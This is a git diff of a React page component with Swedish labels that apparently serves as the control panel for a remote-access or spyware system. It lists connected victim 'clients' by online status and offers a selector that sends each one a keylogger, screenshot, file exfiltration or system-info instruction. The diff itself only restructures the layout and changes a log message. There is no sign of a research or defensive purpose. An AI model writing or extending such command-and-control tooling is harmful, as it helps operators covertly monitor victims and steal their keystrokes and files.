@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import { Card, CardContent } from "@/components/ui/card";
@@ -12,7 +11,6 @@ import { Input } from "@/components/ui/input";
 import { SearchIcon } from "lucide-react";
 import { toast } from "sonner";
 import { getClients, updateClientInstruction, ClientInstruction } from "@/services/scriptsService";
-import { AppLayout } from "@/components/layout/AppLayout";
 
 interface FormattedClient {
   id: string;
@@ -65,7 +63,7 @@ export default function Clients() {
         console.log(`Fetched ${formattedClients.length} clients successfully`);
         return { clients: formattedClients };
       } catch (error) {
-        console.error("Error fetching clients:", error);
+        console.error("Error fetching client data:", error);
         return { clients: [] };
       }
     },
@@ -215,161 +213,159 @@ export default function Clients() {
   }
   
   return (
-    <AppLayout>
-      <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
-        <div className="flex items-center justify-between">
-          <h2 className="text-3xl font-bold tracking-tight">Klienter</h2>
-          <div className="flex items-center space-x-2">
-            <Badge variant="outline">
-              Totalt: {clients.length}
-            </Badge>
-            <Badge variant="outline" className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200">
-              Online: {onlineCount}
-            </Badge>
-            <Badge variant="outline" className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200">
-              Offline: {offlineCount}
-            </Badge>
-            <Button 
-              variant="outline" 
-              size="sm" 
-              onClick={refreshClients}
-              disabled={isRefreshing}
-            >
-              {isRefreshing ? "Uppdaterar..." : "Uppdatera"}
-            </Button>
-          </div>
+    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
+      <div className="flex items-center justify-between">
+        <h2 className="text-3xl font-bold tracking-tight">Klienter</h2>
+        <div className="flex items-center space-x-2">
+          <Badge variant="outline">
+            Totalt: {clients.length}
+          </Badge>
+          <Badge variant="outline" className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200">
+            Online: {onlineCount}
+          </Badge>
+          <Badge variant="outline" className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200">
+            Offline: {offlineCount}
+          </Badge>
+          <Button 
+            variant="outline" 
+            size="sm" 
+            onClick={refreshClients}
+            disabled={isRefreshing}
+          >
+            {isRefreshing ? "Uppdaterar..." : "Uppdatera"}
+          </Button>
         </div>
-
-        {!selectedClient ? (
-          <>
-            <div className="flex flex-col md:flex-row items-center gap-4">
-              <div className="relative w-full md:w-96">
-                <SearchIcon className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
-                <Input
-                  type="search"
-                  placeholder="Sök klienter..."
-                  className="w-full pl-8"
-                  value={searchTerm}
-                  onChange={(e) => setSearchTerm(e.target.value)}
-                />
-              </div>
-              <Select
-                value={statusFilter}
-                onValueChange={setStatusFilter}
-              >
-                <SelectTrigger className="w-full md:w-40">
-                  <SelectValue placeholder="Status" />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="all">Alla statusar</SelectItem>
-                  <SelectItem value="online">Online</SelectItem>
-                  <SelectItem value="offline">Offline</SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
-
-            <Tabs value={activeTab} onValueChange={setActiveTab}>
-              <TabsList className="grid w-full md:w-[400px] grid-cols-2">
-                <TabsTrigger value="all">Alla klienter</TabsTrigger>
-                <TabsTrigger value="active">Aktiva klienter</TabsTrigger>
-              </TabsList>
-              <TabsContent value="all" className="mt-6">
-                {filteredClients.length === 0 && !isLoading ? (
-                  <Card>
-                    <CardContent className="p-6 text-center">
-                      <p className="text-muted-foreground">Inga klienter hittades</p>
-                      <p className="text-sm text-muted-foreground mt-2">
-                        {searchTerm || statusFilter !== "all" 
-                          ? "Prova att ändra dina sökfilter" 
-                          : "Inga klienter har anslutit till servern ännu"}
-                      </p>
-                    </CardContent>
-                  </Card>
-                ) : (
-                  <ClientsList 
-                    clients={filteredClients} 
-                    isLoading={isLoading} 
-                    onClientClick={handleClientClick} 
-                    onRefresh={refreshClients}
-                  />
-                )}
-              </TabsContent>
-              <TabsContent value="active" className="mt-6">
-                {filteredClients.filter(client => client.isActive).length === 0 && !isLoading ? (
-                  <Card>
-                    <CardContent className="p-6 text-center">
-                      <p className="text-muted-foreground">Inga aktiva klienter hittades</p>
-                      <p className="text-sm text-muted-foreground mt-2">
-                        {searchTerm 
-                          ? "Prova att ändra dina sökfilter" 
-                          : "Inga klienter är aktiva just nu"}
-                      </p>
-                    </CardContent>
-                  </Card>
-                ) : (
-                  <ClientsList 
-                    clients={filteredClients.filter(client => client.isActive)} 
-                    isLoading={isLoading} 
-                    onClientClick={handleClientClick} 
-                    onRefresh={refreshClients}
-                  />
-                )}
-              </TabsContent>
-            </Tabs>
-          </>
-        ) : (
-          <div className="flex flex-col space-y-6">
-            <Button 
-              variant="outline" 
-              onClick={handleClientBack}
-              className="w-24"
-            >
-              Tillbaka
-            </Button>
-            {selectedClientData && (
-              <div className="space-y-4">
-                <div className="flex flex-wrap gap-2">
-                  <Button 
-                    variant="outline" 
-                    onClick={() => handlePingClient(selectedClientData.id)}
-                  >
-                    Pinga klient
-                  </Button>
-                  <Button 
-                    variant="outline" 
-                    onClick={() => handleClearLogs(selectedClientData.id)}
-                  >
-                    Rensa loggar
-                  </Button>
-                  <Select
-                    value={selectedClientData.instruction || "standard"}
-                    onValueChange={(value) => handleUpdateInstruction(selectedClientData.id, value)}
-                  >
-                    <SelectTrigger className="w-full md:w-48">
-                      <SelectValue placeholder="Instruktionstyp" />
-                    </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="standard">Standard</SelectItem>
-                      <SelectItem value="keylogger">Tangentloggare</SelectItem>
-                      <SelectItem value="screenshot">Skärmdump</SelectItem>
-                      <SelectItem value="file_exfiltration">Filexfiltration</SelectItem>
-                      <SelectItem value="system_info">Systeminformation</SelectItem>
-                    </SelectContent>
-                  </Select>
-                </div>
-                <ClientDetails client={selectedClientData} />
-              </div>
-            )}
-            {!selectedClientData && (
-              <Card>
-                <CardContent className="p-6">
-                  <p className="text-center text-muted-foreground">Klienten kunde inte hittas</p>
-                </CardContent>
-              </Card>
-            )}
-          </div>
-        )}
       </div>
-    </AppLayout>
+
+      {!selectedClient ? (
+        <>
+          <div className="flex flex-col md:flex-row items-center gap-4">
+            <div className="relative w-full md:w-96">
+              <SearchIcon className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
+              <Input
+                type="search"
+                placeholder="Sök klienter..."
+                className="w-full pl-8"
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+              />
+            </div>
+            <Select
+              value={statusFilter}
+              onValueChange={setStatusFilter}
+            >
+              <SelectTrigger className="w-full md:w-40">
+                <SelectValue placeholder="Status" />
+              </SelectTrigger>
+              <SelectContent>
+                <SelectItem value="all">Alla statusar</SelectItem>
+                <SelectItem value="online">Online</SelectItem>
+                <SelectItem value="offline">Offline</SelectItem>
+              </SelectContent>
+            </Select>
+          </div>
+
+          <Tabs value={activeTab} onValueChange={setActiveTab}>
+            <TabsList className="grid w-full md:w-[400px] grid-cols-2">
+              <TabsTrigger value="all">Alla klienter</TabsTrigger>
+              <TabsTrigger value="active">Aktiva klienter</TabsTrigger>
+            </TabsList>
+            <TabsContent value="all" className="mt-6">
+              {filteredClients.length === 0 && !isLoading ? (
+                <Card>
+                  <CardContent className="p-6 text-center">
+                    <p className="text-muted-foreground">Inga klienter hittades</p>
+                    <p className="text-sm text-muted-foreground mt-2">
+                      {searchTerm || statusFilter !== "all" 
+                        ? "Prova att ändra dina sökfilter" 
+                        : "Inga klienter har anslutit till servern ännu"}
+                    </p>
+                  </CardContent>
+                </Card>
+              ) : (
+                <ClientsList 
+                  clients={filteredClients} 
+                  isLoading={isLoading} 
+                  onClientClick={handleClientClick} 
+                  onRefresh={refreshClients}
+                />
+              )}
+            </TabsContent>
+            <TabsContent value="active" className="mt-6">
+              {filteredClients.filter(client => client.isActive).length === 0 && !isLoading ? (
+                <Card>
+                  <CardContent className="p-6 text-center">
+                    <p className="text-muted-foreground">Inga aktiva klienter hittades</p>
+                    <p className="text-sm text-muted-foreground mt-2">
+                      {searchTerm 
+                        ? "Prova att ändra dina sökfilter" 
+                        : "Inga klienter är aktiva just nu"}
+                    </p>
+                  </CardContent>
+                </Card>
+              ) : (
+                <ClientsList 
+                  clients={filteredClients.filter(client => client.isActive)} 
+                  isLoading={isLoading} 
+                  onClientClick={handleClientClick} 
+                  onRefresh={refreshClients}
+                />
+              )}
+            </TabsContent>
+          </Tabs>
+        </>
+      ) : (
+        <div className="flex flex-col space-y-6">
+          <Button 
+            variant="outline" 
+            onClick={handleClientBack}
+            className="w-24"
+          >
+            Tillbaka
+          </Button>
+          {selectedClientData && (
+            <div className="space-y-4">
+              <div className="flex flex-wrap gap-2">
+                <Button 
+                  variant="outline" 
+                  onClick={() => handlePingClient(selectedClientData.id)}
+                >
+                  Pinga klient
+                </Button>
+                <Button 
+                  variant="outline" 
+                  onClick={() => handleClearLogs(selectedClientData.id)}
+                >
+                  Rensa loggar
+                </Button>
+                <Select
+                  value={selectedClientData.instruction || "standard"}
+                  onValueChange={(value) => handleUpdateInstruction(selectedClientData.id, value)}
+                >
+                  <SelectTrigger className="w-full md:w-48">
+                    <SelectValue placeholder="Instruktionstyp" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="standard">Standard</SelectItem>
+                    <SelectItem value="keylogger">Tangentloggare</SelectItem>
+                    <SelectItem value="screenshot">Skärmdump</SelectItem>
+                    <SelectItem value="file_exfiltration">Filexfiltration</SelectItem>
+                    <SelectItem value="system_info">Systeminformation</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+              <ClientDetails client={selectedClientData} />
+            </div>
+          )}
+          {!selectedClientData && (
+            <Card>
+              <CardContent className="p-6">
+                <p className="text-center text-muted-foreground">Klienten kunde inte hittas</p>
+              </CardContent>
+            </Card>
+          )}
+        </div>
+      )}
+    </div>
   );
 }
